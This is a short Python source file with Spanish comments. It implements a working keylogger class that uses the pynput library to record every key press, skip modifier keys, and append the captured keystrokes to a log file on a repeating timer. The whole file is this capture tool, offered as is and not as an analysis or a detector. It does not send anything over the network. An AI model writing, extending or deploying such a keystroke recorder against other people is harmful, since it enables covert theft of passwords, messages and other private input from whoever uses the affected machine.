import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, intervalo, archivo_log):
        # Log inicial que indica que el keylogger ha comenzado
        self.log = "INICIÓ EL KEYLOGGER"
        # Intervalo en segundos para reportar el log
        self.intervalo = intervalo
        # Ruta del archivo donde se guardará el log
        self.archivo_log = archivo_log
        # Lista de teclas especiales a ignorar
        self.teclas_ignoradas = {pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r, pynput.keyboard.Key.shift_l, pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_r, pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r, pynput.keyboard.Key.alt_l, pynput.keyboard.Key.caps_lock, pynput.keyboard.Key.tab, pynput.keyboard.Key.esc}

    def append_to_log(self, string):
        # Agrega el texto al log
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            # Intenta obtener el carácter de la tecla presionada
            current_key = str(key.char)
        except AttributeError:
            # Si la tecla no tiene un atributo 'char', maneja teclas especiales
            if key in self.teclas_ignoradas:
                # Si la tecla está en la lista de teclas a ignorar, no hacer nada
                return
            elif key == pynput.keyboard.Key.space:
                # Si la tecla es el espacio, representa el espacio en blanco
                current_key = " "
            else:
                # Para otras teclas especiales, agrega una representación de la tecla entre espacios
                current_key = " " + str(key) + " "
        # Agrega la tecla al log
        self.append_to_log(current_key)

    def report(self):
        # Abre el archivo en modo append para agregar el contenido del log
        with open(self.archivo_log, "a") as file:
            # Escribe el contenido del log en el archivo
            file.write(self.log + "\n")
        # Reinicia el log a una cadena vacía
        self.log = ""
        # Crea un temporizador que llamará a 'report' después del intervalo especificado
        timer = threading.Timer(self.intervalo, self.report)
        # Inicia el temporizador
        timer.start()

    def start(self):
        # Crea un escuchador de teclado que llamará a 'process_key_press' en cada pulsación de tecla
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        # Usa el escuchador de teclado en un contexto de administrador
        with keyboard_listener:
            # Comienza a reportar las teclas en intervalos regulares
            self.report()
            # Espera a que el escuchador de teclado termine
            keyboard_listener.join()
